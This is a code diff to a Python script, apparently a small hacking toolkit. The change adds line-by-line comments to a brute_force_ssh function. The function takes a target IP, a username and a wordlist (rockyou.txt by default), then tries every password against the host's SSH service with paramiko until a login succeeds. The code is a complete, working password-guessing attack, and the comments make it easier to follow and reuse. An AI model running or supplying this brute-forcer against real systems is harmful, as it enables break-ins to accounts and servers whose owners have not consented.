@@ -59,39 +59,49 @@ def check_password():
     print(f"Password check completed in {t2 - t1:.2f} seconds.")  # Print the duration of the check
 
 def brute_force_ssh():
+    # Prompt user for the target IP address
     ip = input("Enter the target IP address:\n")
+    # Prompt user for the SSH username
     username = input("Enter the SSH username:\n")
+    # Prompt user for the dictionary filepath, with a default of "rockyou.txt"
     filepath = input("Enter your dictionary filepath:\n") or "rockyou.txt"
     
+    # Check if the specified dictionary file exists
     if not os.path.isfile(filepath):
         print(f"File not found: {filepath}")
-        return
+        return  # Exit if the file does not exist
     
+    # Open the dictionary file with the specified encoding
     file = open(filepath, encoding="ISO-8859-1")
-    line = file.readline()
+    line = file.readline()  # Read the first line from the file
     
+    # Initialize the SSH client
     ssh = paramiko.SSHClient()
+    # Automatically add the server's host key
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     
+    # Loop through each line in the dictionary file
     while line:
-        line = line.rstrip()
-        password = line
+        line = line.rstrip()  # Remove any trailing whitespace
+        password = line  # Use the line as the password
         
         try:
+            # Attempt to connect to the SSH server with the current password
             ssh.connect(ip, port=22, username=username, password=password, timeout=3)
             print(f"Success! Username: {username} Password: {password}")
-            break
+            break  # Exit the loop if the connection is successful
         except paramiko.AuthenticationException:
+            # Handle incorrect password
             print(f"Failed: {password}")
         except Exception as e:
+            # Handle other exceptions, such as connection errors
             print(f"Connection error: {e}")
-            break
+            break  # Exit the loop on connection error
         
-        line = file.readline()
+        line = file.readline()  # Read the next line from the file
     
-    file.close()
-    ssh.close()
-
+    file.close()  # Close the dictionary file
+    ssh.close()  # Close the SSH connection
 # Main
 if __name__ == "__main__":  # This condition ensures the script runs only if it is executed directly
     while True:  # Start an infinite loop
